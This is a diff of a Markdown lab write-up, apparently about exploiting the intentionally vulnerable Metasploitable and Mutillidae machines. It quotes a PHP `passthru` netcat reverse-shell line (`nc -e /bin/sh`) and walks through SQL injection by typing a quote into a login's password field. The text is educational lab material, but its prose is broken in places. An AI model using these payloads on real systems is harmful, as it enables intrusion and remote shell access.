@@ -149,7 +149,26 @@ passthru("nc -e /bin/sh 8080");
 > ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/30ead58e-eb9b-482f-bf51-2bbb7e7c5968)
 >
 > __Security at HIGH__: the expoit is impossible because it retrieves only `include.php` page.cannot access another files it, so it is difficult to exploit them.
+>
 > 
 
+<h3 align="center"> ... </h3> 
+
+## SQL Injection Vulnerability
+
+- to open run the mutillidae make sure that the setting is done in metaspoitable machine.
+```
+https://www.youtube.com/watch?v=tYmDiz0SPaw&feature=youtu.be
+```
+- now register your account in the mutillidae and the logout again. hence it creates a account for and use that account to expoit the sql injection.
+- now logout and to break the page we should use `'and'`,`'order by'` or `'`
+- now at the admin page type your username and at the password keep `'` and try to login it retrives as shown in the image
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a2799618-c66e-481a-af55-a292f9228402)
+- If we get this page it is very easy to do sql injection.
+- And now again logout. and keep the following notepad
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a2ec20c7-88cd-485f-be71-99f1c763629c)
+- this is basically called blackbox testing. there will be no code to be executed or URLs to be editing.
+- 
+- 
 
 
